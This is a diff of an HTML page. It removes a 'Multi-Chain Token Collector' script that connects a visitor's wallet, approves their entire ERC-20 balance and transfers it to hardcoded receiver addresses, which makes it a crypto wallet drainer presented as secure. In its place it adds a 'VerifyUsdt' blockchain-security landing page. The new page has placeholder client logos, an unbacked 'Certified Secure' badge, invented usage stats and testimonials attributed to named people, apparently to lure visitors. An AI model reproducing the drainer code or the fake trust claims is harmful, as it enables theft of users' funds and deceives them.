@@ -1,295 +1,327 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="description" content="Securely transfer ERC-20 tokens to a receiver wallet on Ethereum or Binance Smart Chain." />
-  <meta name="keywords" content="blockchain, ERC-20, token transfer, Ethereum, BSC, dApp" />
-  <title>Multi-Chain Token Collector</title>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6.12.1/dist/ethers.umd.min.js"></script>
-  <style>
-    :root {
-      --primary-color: #4e44ce;
-      --hover-primary: #372fb5;
-      --bg-color: #0f0f1e;
-      --text-color: #fff;
-      --input-bg: #2a2a3a;
-    }
-
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-
-    body {
-      background: var(--bg-color);
-      color: var(--text-color);
-      font-family: 'Segoe UI', sans-serif;
-      padding: 20px;
-      text-align: center;
-    }
-
-    .container {
-      max-width: 600px;
-      margin: 0 auto;
-    }
-
-    h1 {
-      font-size: 2rem;
-      margin-bottom: 20px;
-      color: var(--primary-color);
-    }
-
-    p {
-      font-size: 1rem;
-      margin-bottom: 20px;
-    }
-
-    .form-group {
-      margin-bottom: 15px;
-      text-align: left;
-    }
-
-    label {
-      display: block;
-      font-size: 0.9rem;
-      margin-bottom: 5px;
-    }
-
-    input {
-      width: 100%;
-      padding: 10px;
-      background: var(--input-bg);
-      border: none;
-      border-radius: 5px;
-      color: var(--text-color);
-      font-size: 1rem;
-    }
-
-    input:focus {
-      outline: none;
-      box-shadow: 0 0 5px var(--primary-color);
-    }
-
-    .btn {
-      background: var(--primary-color);
-      color: var(--text-color);
-      border: none;
-      padding: 15px 30px;
-      border-radius: 10px;
-      font-size: 1rem;
-      cursor: pointer;
-      width: 100%;
-      max-width: 300px;
-      margin: 10px auto;
-      display: block;
-      transition: background-color 0.3s ease;
-    }
-
-    .btn:hover {
-      background: var(--hover-primary);
-    }
-
-    .btn:disabled {
-      background: #555;
-      cursor: not-allowed;
-    }
-
-    .status-message {
-      margin: 15px 0;
-      font-size: 0.9rem;
-      word-break: break-all;
-    }
-
-    @media (max-width: 768px) {
-      body {
-        padding: 10px;
-      }
-
-      h1 {
-        font-size: 1.5rem;
-      }
-
-      .btn {
-        padding: 12px 20px;
-      }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="VerifyUsdt ensures secure blockchain transactions with advanced USDT monitoring, risk detection, and threat interception.">
+    <meta name="keywords" content="blockchain security, USDT, VerifyUsdt, crypto safety, Web3">
+    <title>VerifyUsdt - Trusted Blockchain Security</title>
+    <link rel="icon" href="https://via.placeholder.com/32" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /* Custom Animations */
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .animate-fadeIn { animation: fadeIn 0.8s ease-out forwards; }
+        .particle { position: absolute; background: rgba(255, 255, 255, 0.3); border-radius: 50%; }
+    </style>
 </head>
-<body>
-  <div class="container">
-    <h1>Multi-Chain Token Collector</h1>
-    <p>Connect your MetaMask or Trust Wallet to transfer ERC-20 tokens.</p>
-    <button class="btn" id="connectBtn" aria-label="Connect Wallet">Connect Wallet</button>
-    <div id="transferSection" style="display: none;">
-      <form id="transferForm">
-        <div class="form-group">
-          <label for="tokenAddress">ERC-20 Token Contract Address</label>
-          <input type="text" id="tokenAddress" placeholder="0x..." required />
+<body class="bg-gray-50 dark:bg-gray-900 text-gray-900 dark:text-gray-100 font-['Inter'] transition-colors duration-300">
+    <!-- Theme Toggle -->
+    <button id="theme-toggle" class="fixed top-4 right-4 p-2 rounded-full bg-gray-200 dark:bg-gray-700 z-50" aria-label="Toggle dark mode">
+        <span class="material-icons">dark_mode</span>
+    </button>
+
+    <!-- Header -->
+    <header class="bg-gradient-to-r from-blue-800 to-indigo-900 text-white sticky top-0 z-40 shadow-lg">
+        <div class="container mx-auto px-4 py-4 flex justify-between items-center">
+            <div class="logo flex items-center space-x-2">
+                <img src="https://via.placeholder.com/40" alt="VerifyUsdt Logo" class="h-10">
+                <h1 class="text-2xl font-bold">VerifyUsdt</h1>
+            </div>
+            <nav class="hidden md:flex space-x-6" aria-label="Main navigation">
+                <a href="#home" class="hover:text-yellow-300 transition">Home</a>
+                <a href="#about" class="hover:text-yellow-300 transition">About</a>
+                <a href="#services" class="hover:text-yellow-300 transition">Services</a>
+                <a href="#contact" class="hover:text-yellow-300 transition">Contact</a>
+            </nav>
+            <button id="mobile-menu-btn" class="md:hidden p-2" aria-label="Toggle mobile menu">
+                <span class="material-icons">menu</span>
+            </button>
         </div>
-        <button type="submit" class="btn" id="transferBtn" aria-label="Transfer Tokens">Transfer Tokens</button>
-      </form>
-    </div>
-    <div class="status-message" id="status"></div>
-  </div>
+        <div id="mobile-menu" class="hidden md:hidden bg-blue-900">
+            <nav class="flex flex-col space-y-2 px-4 py-2" aria-label="Mobile navigation">
+                <a href="#home" class="hover:text-yellow-300 transition">Home</a>
+                <a href="#about" class="hover:text-yellow-300 transition">About</a>
+                <a href="#services" class="hover:text-yellow-300 transition">Services</a>
+                <a href="#contact" class="hover:text-yellow-300 transition">Contact</a>
+            </nav>
+        </div>
+    </header>
 
-  <script>
-    const RECEIVER_ADDRESSES = {
-      1: "YOUR_ETH_RECEIVER_ADDRESS", // Ethereum Mainnet
-      56: "YOUR_BNB_RECEIVER_ADDRESS" // BNB Smart Chain
-    };
+    <!-- Hero Section with Particles -->
+    <section id="home" class="relative py-24 bg-gradient-to-br from-blue-700 to-indigo-800 text-white overflow-hidden">
+        <canvas id="particle-canvas" class="absolute inset-0"></canvas>
+        <div class="container mx-auto px-4 text-center relative z-10">
+            <h2 class="text-4xl md:text-6xl font-bold mb-4 animate-fadeIn">Trusted Blockchain Security</h2>
+            <p class="text-lg md:text-2xl mb-6 animate-fadeIn" style="animation-delay: 0.2s;">Advanced USDT monitoring, risk detection, and threat interception for seamless, worry-free transactions.</p>
+            <a href="#contact" class="inline-block bg-yellow-400 text-gray-900 px-8 py-3 rounded-full font-semibold hover:bg-yellow-500 transition animate-fadeIn" style="animation-delay: 0.4s;">Get Protected Now</a>
+        </div>
+    </section>
 
-    const ERC20_ABI = [
-      "function balanceOf(address) view returns (uint256)",
-      "function transfer(address to, uint256 amount) returns (bool)",
-      "function approve(address spender, uint256 amount) returns (bool)",
-      "function allowance(address owner, address spender) view returns (uint256)",
-      "function decimals() view returns (uint8)"
-    ];
+    <!-- Stats Section -->
+    <section class="py-16 bg-white dark:bg-gray-800 text-center">
+        <div class="container mx-auto px-4">
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <div class="animate-fadeIn">
+                    <h3 class="text-3xl font-bold text-blue-600 dark:text-blue-400">10,000+</h3>
+                    <p class="text-gray-600 dark:text-gray-300">Trusted Users</p>
+                </div>
+                <div class="animate-fadeIn" style="animation-delay: 0.2s;">
+                    <h3 class="text-3xl font-bold text-blue-600 dark:text-blue-400">99.9%</h3>
+                    <p class="text-gray-600 dark:text-gray-300">Uptime Guarantee</p>
+                </div>
+                <div class="animate-fadeIn" style="animation-delay: 0.4s;">
+                    <h3 class="text-3xl font-bold text-blue-600 dark:text-blue-400">24/7</h3>
+                    <p class="text-gray-600 dark:text-gray-300">Support Availability</p>
+                </div>
+            </div>
+        </div>
+    </section>
 
-    const chainConfigs = {
-      1: { name: "Ethereum Mainnet", explorer: "https://etherscan.io/tx/" },
-      56: { name: "BNB Smart Chain", explorer: "https://bscscan.com/tx/" }
-    };
+    <!-- About Section -->
+    <section id="about" class="py-16 text-center">
+        <div class="container mx-auto px-4">
+            <h2 class="text-3xl font-bold mb-4 animate-fadeIn">The Gold Standard in Blockchain Security</h2>
+            <p class="text-lg text-gray-600 dark:text-gray-300 mb-6 animate-fadeIn" style="animation-delay: 0.2s;">VerifyUsdt is your trusted partner in securing Web3 ecosystems with cutting-edge technology and unmatched expertise.</p>
+            <img src="https://images.unsplash.com/photo-1620712943543-bcc4688e7485?auto=format&fit=crop&w=800" alt="Blockchain Security Illustration" class="mx-auto rounded-lg shadow-lg max-w-full h-auto">
+        </div>
+    </section>
 
-    // Show status messages
-    function showStatus(message) {
-      document.getElementById("status").innerHTML = message;
-    }
+    <!-- Features Section -->
+    <section id="services" class="py-16 bg-gray-100 dark:bg-gray-800">
+        <div class="container mx-auto px-4">
+            <h2 class="text-3xl font-bold text-center mb-12 animate-fadeIn">Our Core Solutions</h2>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8">
+                <div class="p-6 bg-white dark:bg-gray-700 rounded-xl shadow-lg hover:shadow-xl transition animate-fadeIn">
+                    <span class="material-icons text-5xl text-blue-600 mb-4">verified_user</span>
+                    <h3 class="text-xl font-semibold mb-2">Protect</h3>
+                    <p class="text-gray-600 dark:text-gray-300 mb-4">Secure onchain USDT with advanced access controls and surveillance.</p>
+                    <span class="inline-block bg-blue-100 dark:bg-blue-600 text-blue-800 dark:text-white px-3 py-1 rounded-full text-sm">Contract Guard</span>
+                </div>
+                <div class="p-6 bg-white dark:bg-gray-700 rounded-xl shadow-lg hover:shadow-xl transition animate-fadeIn" style="animation-delay: 0.2s;">
+                    <span class="material-icons text-5xl text-blue-600 mb-4">sensors</span>
+                    <h3 class="text-xl font-semibold mb-2">Detect</h3>
+                    <p class="text-gray-600 dark:text-gray-300 mb-4">Identify risks with real-time alerts and comprehensive reports.</p>
+                    <span class="inline-block bg-blue-100 dark:bg-blue-600 text-blue-800 dark:text-white px-3 py-1 rounded-full text-sm">Risk Monitoring</span>
+                    <span class="inline-block bg-blue-100 dark:bg-blue-600 text-blue-800 dark:text-white px-3 py-1 rounded-full text-sm">Transaction Screening</span>
+                </div>
+                <div class="p-6 bg-white dark:bg-gray-700 rounded-xl shadow-lg hover:shadow-xl transition animate-fadeIn" style="animation-delay: 0.4s;">
+                    <span class="material-icons text-5xl text-blue-600 mb-4">block</span>
+                    <h3 class="text-xl font-semibold mb-2">Intercept</h3>
+                    <p class="text-gray-600 dark:text-gray-300 mb-4">Neutralize threats with automated onchain responses.</p>
+                    <span class="inline-block bg-blue-100 dark:bg-blue-600 text-blue-800 dark:text-white px-3 py-1 rounded-full text-sm">Attack Interceptor</span>
+                </div>
+            </div>
+        </div>
+    </section>
 
-    // Validate Ethereum address
-    function isValidAddress(address) {
-      return ethers.isAddress(address);
-    }
+    <!-- Trusted By Section -->
+    <section class="py-16 bg-white dark:bg-gray-900 text-center">
+        <div class="container mx-auto px-4">
+            <h2 class="text-3xl font-bold mb-8 animate-fadeIn">Trusted by Industry Leaders</h2>
+            <div class="flex flex-wrap justify-center gap-6">
+                <img src="https://via.placeholder.com/120x40?text=Client+1" alt="Client 1 Logo" class="h-10 animate-fadeIn">
+                <img src="https://via.placeholder.com/120x40?text=Client+2" alt="Client 2 Logo" class="h-10 animate-fadeIn" style="animation-delay: 0.2s;">
+                <img src="https://via.placeholder.com/120x40?text=Client+3" alt="Client 3 Logo" class="h-10 animate-fadeIn" style="animation-delay: 0.4s;">
+            </div>
+            <div class="mt-6">
+                <span class="inline-block bg-yellow-100 dark:bg-yellow-600 text-yellow-800 dark:text-white px-4 py-2 rounded-full animate-fadeIn" style="animation-delay: 0.6s;">
+                    <span class="material-icons align-middle">security</span> Certified Secure
+                </span>
+            </div>
+        </div>
+    </section>
 
-    // Switch network
-    async function switchNetwork(chainId) {
-      try {
-        await window.ethereum.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: ethers.toBeHex(chainId) }]
+    <!-- Testimonials Section -->
+    <section class="py-16 bg-gray-100 dark:bg-gray-800">
+        <div class="container mx-auto px-4">
+            <h2 class="text-3xl font-bold text-center mb-12 animate-fadeIn">What Our Partners Say</h2>
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+                <div class="p-6 bg-white dark:bg-gray-700 rounded-xl shadow-lg animate-fadeIn">
+                    <p class="text-gray-600 dark:text-gray-300 mb-4">"VerifyUsdt is a game-changer for Web3 security—intuitive and scalable."</p>
+                    <div class="flex items-center">
+                        <img src="https://via.placeholder.com/40" alt="Elroy Cheo" class="h-10 w-10 rounded-full mr-3">
+                        <div>
+                            <h4 class="font-semibold">Elroy Cheo</h4>
+                            <p class="text-sm text-gray-500 dark:text-gray-400">ARC Community, Co-Founder</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="p-6 bg-white dark:bg-gray-700 rounded-xl shadow-lg animate-fadeIn" style="animation-delay: 0.2s;">
+                    <p class="text-gray-600 dark:text-gray-300 mb-4">"VerifyUsdt’s tools are paving the way for mass blockchain adoption."</p>
+                    <div class="flex items-center">
+                        <img src="https://via.placeholder.com/40" alt="Urvit Goel" class="h-10 w-10 rounded-full mr-3">
+                        <div>
+                            <h4 class="font-semibold">Urvit Goel</h4>
+                            <p class="text-sm text-gray-500 dark:text-gray-400">Polygon, VP Global Business Development</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- FAQ Section -->
+    <section id="faq" class="py-16 bg-white dark:bg-gray-900">
+        <div class="container mx-auto px-4">
+            <h2 class="text-3xl font-bold text-center mb-12 animate-fadeIn">Frequently Asked Questions</h2>
+            <div class="space-y-4 max-w-3xl mx-auto">
+                <div class="bg-gray-50 dark:bg-gray-700 rounded-xl p-4">
+                    <button class="faq-toggle w-full text-left font-semibold flex justify-between items-center">
+                        What is VerifyUsdt?
+                        <span class="material-icons">expand_more</span>
+                    </button>
+                    <div class="faq-content hidden mt-2 text-gray-600 dark:text-gray-300">
+                        VerifyUsdt is a leading blockchain security platform that protects USDT transactions through advanced monitoring, risk detection, and threat interception.
+                    </div>
+                </div>
+                <div class="bg-gray-50 dark:bg-gray-700 rounded-xl p-4">
+                    <button class="faq-toggle w-full text-left font-semibold flex justify-between items-center">
+                        How does VerifyUsdt ensure security?
+                        <span class="material-icons">expand_more</span>
+                    </button>
+                    <div class="faq-content hidden mt-2 text-gray-600 dark:text-gray-300">
+                        We use real-time alerts, access controls, and automated onchain responses to safeguard your assets.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Contact Section -->
+    <section id="contact" class="py-16 bg-gradient-to-r from-blue-700 to-indigo-800 text-white">
+        <div class="container mx-auto px-4 text-center">
+            <h2 class="text-3xl font-bold mb-4 animate-fadeIn">Get in Touch</h2>
+            <p class="text-lg mb-8 animate-fadeIn" style="animation-delay: 0.2s;">Have questions? Contact us for a secure blockchain future.</p>
+            <form class="max-w-lg mx-auto space-y-4">
+                <input type="text" placeholder="Your Name" class="w-full p-3 rounded-lg bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-yellow-400" required>
+                <input type="email" placeholder="Your Email" class="w-full p-3 rounded-lg bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-yellow-400" required>
+                <textarea placeholder="Your Message" class="w-full p-3 rounded-lg bg-white text-gray-900 focus:outline-none focus:ring-2 focus:ring-yellow-400" rows="4" required></textarea>
+                <button type="submit" class="bg-yellow-400 text-gray-900 px-8 py-3 rounded-full font-semibold hover:bg-yellow-500 transition">Send Message</button>
+            </form>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="bg-gray-900 text-white py-12">
+        <div class="container mx-auto px-4">
+            <div class="grid grid-cols-1 md:grid-cols-4 gap-8">
+                <div>
+                    <h2 class="text-2xl font-bold mb-4 flex items-center">
+                        <img src="https://via.placeholder.com/40" alt="VerifyUsdt Logo" class="h-10 mr-2"> VerifyUsdt
+                    </h2>
+                </div>
+                <div>
+                    <h3 class="text-lg font-semibold mb-4">Company</h3>
+                    <ul class="space-y-2">
+                        <li><a href="#about" class="hover:text-yellow-400 transition">About</a></li>
+                        <li><a href="/careers.html" class="hover:text-yellow-400 transition">Careers</a></li>
+                        <li><a href="#contact" class="hover:text-yellow-400 transition">Contact</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="text-lg font-semibold mb-4">Products</h3>
+                    <ul class="space-y-2">
+                        <li><a href="#services" class="hover:text-yellow-400 transition">Contract Guard</a></li>
+                        <li><a href="#services" class="hover:text-yellow-400 transition">Risk Monitoring</a></li>
+                        <li><a href="#services" class="hover:text-yellow-400 transition">Attack Interceptor</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="text-lg font-semibold mb-4">Resources</h3>
+                    <ul class="space-y-2">
+                        <li><a href="/docs.html" class="hover:text-yellow-400 transition">Documentation</a></li>
+                        <li><a href="/blog.html" class="hover:text-yellow-400 transition">Blog</a></li>
+                        <li><a href="/support.html" class="hover:text-yellow-400 transition">Support</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="mt-8 text-center">
+                <p>© 2025 VerifyUsdt. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Sticky CTA -->
+    <a href="#contact" class="fixed bottom-4 right-4 bg-yellow-400 text-gray-900 px-6 py-3 rounded-full font-semibold hover:bg-yellow-500 transition shadow-lg z-50 animate-fadeIn" style="animation-delay: 1s;">Contact Us</a>
+
+    <!-- JavaScript -->
+    <script>
+        // Smooth Scrolling
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function(e) {
+                e.preventDefault();
+                document.querySelector(this.getAttribute('href')).scrollIntoView({
+                    behavior: 'smooth'
+                });
+            });
         });
-      } catch (error) {
-        showStatus(`Failed to switch network: ${error.message}`);
-        throw error;
-      }
-    }
 
-    // Connect wallet
-    async function connectWallet() {
-      const connectBtn = document.getElementById("connectBtn");
-      connectBtn.disabled = true;
+        // Mobile Menu Toggle
+        const mobileMenuBtn = document.getElementById('mobile-menu-btn');
+        const mobileMenu = document.getElementById('mobile-menu');
+        mobileMenuBtn.addEventListener('click', () => {
+            mobileMenu.classList.toggle('hidden');
+        });
 
-      try {
-        if (!window.ethereum) {
-          showStatus("Please install MetaMask or Trust Wallet!");
-          return;
+        // Dark Mode Toggle
+        const themeToggle = document.getElementById('theme-toggle');
+        themeToggle.addEventListener('click', () => {
+            document.body.classList.toggle('dark');
+            themeToggle.querySelector('span').textContent = document.body.classList.contains('dark') ? 'light_mode' : 'dark_mode';
+        });
+
+        // FAQ Accordion
+        document.querySelectorAll('.faq-toggle').forEach(toggle => {
+            toggle.addEventListener('click', () => {
+                const content = toggle.nextElementSibling;
+                content.classList.toggle('hidden');
+                toggle.querySelector('span').textContent = content.classList.contains('hidden') ? 'expand_more' : 'expand_less';
+            });
+        });
+
+        // Particle Animation
+        const canvas = document.getElementById('particle-canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const particles = [];
+        for (let i = 0; i < 50; i++) {
+            particles.push({
+                x: Math.random() * canvas.width,
+                y: Math.random() * canvas.height,
+                radius: Math.random() * 3 + 1,
+                vx: Math.random() * 0.5 - 0.25,
+                vy: Math.random() * 0.5 - 0.25
+            });
         }
-
-        const provider = new ethers.BrowserProvider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-        const signer = await provider.getSigner();
-        const address = await signer.getAddress();
-        const network = await provider.getNetwork();
-        const chainId = Number(network.chainId);
-
-        if (!RECEIVER_ADDRESSES[chainId]) {
-          showStatus("This chain is not supported. Please switch to Ethereum or BSC.");
-          return;
+        function animateParticles() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            particles.forEach(p => {
+                p.x += p.vx;
+                p.y += p.vy;
+                if (p.x < 0 || p.x > canvas.width) p.vx *= -1;
+                if (p.y < 0 || p.y > canvas.height) p.vy *= -1;
+                ctx.beginPath();
+                ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
+                ctx.fillStyle = 'rgba(255, 255, 255, 0.5)';
+                ctx.fill();
+            });
+            requestAnimationFrame(animateParticles);
         }
+        animateParticles();
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
 
-        showStatus(`Connected: ${address.slice(0, 6)}...${address.slice(-4)}<br>Chain: ${chainConfigs[chainId].name}`);
-        document.getElementById("transferSection").style.display = "block";
-        connectBtn.style.display = "none";
-      } catch (error) {
-        showStatus(`Connection failed: ${error.message}`);
-      } finally {
-        connectBtn.disabled = false;
-      }
-    }
-
-    // Transfer tokens
-    async function transferTokens(event) {
-      event.preventDefault();
-      const transferBtn = document.getElementById("transferBtn");
-      transferBtn.disabled = true;
-
-      try {
-        const provider = new ethers.BrowserProvider(window.ethereum);
-        const signer = await provider.getSigner();
-        const userAddress = await signer.getAddress();
-        const network = await provider.getNetwork();
-        const chainId = Number(network.chainId);
-        const tokenAddress = document.getElementById("tokenAddress").value.trim();
-        const receiver = RECEIVER_ADDRESSES[chainId];
-
-        if (!isValidAddress(tokenAddress)) {
-          showStatus("Invalid token contract address.");
-          return;
-        }
-        if (!receiver) {
-          showStatus("This chain is not supported.");
-          return;
-        }
-
-        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
-        let decimals;
-        try {
-          decimals = await tokenContract.decimals();
-        } catch {
-          showStatus("Invalid ERC-20 token contract.");
-          return;
-        }
-
-        const balance = await tokenContract.balanceOf(userAddress);
-        if (balance === 0n) {
-          showStatus("Token balance is zero.");
-          return;
-        }
-
-        showStatus("Approving tokens...");
-        const approveTx = await tokenContract.approve(receiver, balance);
-        await approveTx.wait();
-
-        const allowance = await tokenContract.allowance(userAddress, receiver);
-        if (allowance >= balance) {
-          showStatus("Transferring tokens...");
-          const transferTx = await tokenContract.transfer(receiver, balance);
-          const receipt = await transferTx.wait();
-          showStatus(
-            `Tokens transferred! <a href="${chainConfigs[chainId].explorer}${receipt.hash}" target="_blank">View on Explorer</a>`
-          );
-          document.getElementById("transferForm").reset();
-        } else {
-          showStatus("Approval failed.");
-        }
-      } catch (error) {
-        showStatus(`Error: ${error.message}`);
-      } finally {
-        transferBtn.disabled = false;
-      }
-    }
-
-    // Handle wallet disconnect or chain change
-    if (window.ethereum) {
-      window.ethereum.on("accountsChanged", (accounts) => {
-        if (accounts.length === 0) {
-          showStatus("Wallet disconnected.");
-          document.getElementById("transferSection").style.display = "none";
-          document.getElementById("connectBtn").style.display = "block";
-        }
-      });
-      window.ethereum.on("chainChanged", () => {
-        showStatus("Network changed. Please reconnect wallet.");
-        document.getElementById("transferSection").style.display = "none";
-        document.getElementById("connectBtn").style.display = "block";
-      });
-    }
-
-    // Event Listeners
-    document.getElementById("connectBtn").addEventListener("click", connectWallet);
-    document.getElementById("transferForm").addEventListener("submit", transferTokens);
-  </script>
+        // Form Submission (Placeholder)
+        document.querySelector('form').addEventListener('submit', e => {
+            e.preventDefault();
+            alert('Form submitted! (This is a placeholder action.)');
+        });
+    </script>
 </body>
 </html>
